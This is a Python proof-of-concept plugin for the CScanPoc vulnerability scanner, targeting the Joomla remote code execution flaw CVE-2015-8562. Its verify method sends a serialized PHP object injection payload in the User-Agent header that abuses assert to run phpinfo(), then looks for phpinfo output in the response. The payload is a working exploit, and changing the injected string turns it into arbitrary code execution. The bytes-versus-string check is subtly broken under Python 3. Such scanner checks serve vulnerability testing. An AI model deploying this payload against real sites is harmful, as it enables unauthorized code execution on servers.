# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.request
import urllib.error
import urllib.parse
import http.cookiejar
import socket
import sys


class Vuln(ABVuln):
    vuln_id = 'Joomla_0003'  # 平台漏洞编号，留空
    name = 'Joomla! 远程命令执行漏洞(CNVD-2015-08250)'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = ' 2015-12-15'  # 漏洞公布时间
    desc = '''
        Joomla是一套基于PHP的开源内容管理系统(CMS)。可用于搭建商业网站、个人博客、信息管理系统、Web 服务等，还可进行二次开发以扩充使用范围。
        Joomla! 存在远程命令执行漏洞，攻击者利用漏洞可在Joomla的数据库中自定义用户代理字符串，并在其中植入恶意代码，并远程执行恶意代码。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2015-08250'  # 漏洞来源
    cnvd_id = 'CNVD-2015-08250'  # cnvd漏洞编号
    cve_id = 'CVE-2015-8562'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = 'Joomla Joomla 1.5.0-3.4.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cfa675bc-7157-465f-8a13-dd2c20e71fdb'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            cj = http.cookiejar.CookieJar()
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(cj))
            urllib.request.install_opener(opener)
            socket.setdefaulttimeout(10)  # 10 秒钟后超时

            ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'

            req = urllib.request.Request(
                url=self.target, headers={'User-Agent': ua})
            opener.open(req)
            #req = urllib2.Request(url=self.target)
            #r = opener.open(req).read()
            # f=open('test.html','a+')
            #print >> f, r
            # f.close()
            if 'SERVER["REMOTE_ADDR"]' in opener.open(req).read() and 'PHP Version' in opener.open(req).read():
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
